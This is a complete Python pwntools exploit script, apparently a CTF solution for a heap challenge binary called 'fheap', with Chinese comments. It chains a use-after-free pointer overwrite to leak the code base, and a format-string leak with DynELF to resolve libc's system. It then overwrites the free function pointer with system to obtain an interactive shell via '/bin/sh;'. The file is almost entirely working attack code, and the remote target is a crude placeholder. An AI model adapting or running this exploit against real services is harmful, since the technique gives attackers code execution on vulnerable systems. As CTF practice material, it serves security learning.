#coding=utf-8
from pwn import*
from ctypes import *
context(os='linux',arch='amd64')
context.log_level = 'debug'
# gdb.attach(p)
# pause()

DEBUG = 1
if DEBUG:
	 p = process('./fheap')
else:
	 p = remote('fuck ip', 6666)

elf = ELF('./fheap')
def pr(a,addr):
	log.success(a+': '+hex(addr))

printf_plt = 0

def create(size,content):
	p.sendafter('quit','create ')
	p.sendlineafter('size:',str(size))
	p.sendafter('str:',content.ljust(size,'\x00'))

def delete(idx):
	p.sendafter('quit','delete ')
	p.sendlineafter('id:',str(idx))
	p.sendlineafter('sure?:','yes ')

def leak(addr):
	delete(0)
	#delete函数中的buf在栈上, 给buf按8字节对齐传入想要泄露的addr, 找到偏移量为9
	payload = 'aa%9$s'.ljust(0x18, '#') + p64(printf_plt)
	create(0x20, payload)
	p.sendafter('quit','delete ')
	p.sendlineafter('id:','1')
	# if addr-(addr&~0xfff) == 0x280:
	# 	gdb.attach(p)
	# 	pause()
	p.sendafter('sure?:','yes11111'+p64(addr))
	p.recvuntil('aa')
	data = p.recvuntil('#')[:-1]
	log.success("%#x => %s" % (addr, (data or '').encode('hex')))
	return data+'\x00' #to DynELF

create(4,'aa')#0
create(4,'bb')#1
delete(1)
delete(0)

payload = 'a' * 0x10 + 'b' * 0x8 + '\x2d' #free->puts
create(0x20, payload)
# gdb.attach(p)
# pause()

delete(1) #调用puts函数
p.recvuntil('b' * 0x8)
call_puts = u64(p.recvline()[-7:-1].ljust(8,'\x00'))
codebase = call_puts - 0xd2d
printf_plt = codebase + 0x9d0
pr('codebase',codebase)
pr('printf_plt',printf_plt)

# gdb.attach(p)
# pause()
delete(0)
# gdb.attach(p)
# pause()
data = 'a' * 0x10 + 'b'*0x8
create(0x20, data)
delete(1)

d = DynELF(leak, codebase, elf=ELF('./fheap'))
system_addr = d.lookup('system', 'libc')
pr('system_addr',system_addr)

# 用system函数覆盖free函数
delete(0)
payload = '/bin/sh;'.ljust(0x18, 'c') + p64(system_addr)
create(0x20, payload)
# gdb.attach(p)
# pause()
delete(1)

p.interactive()
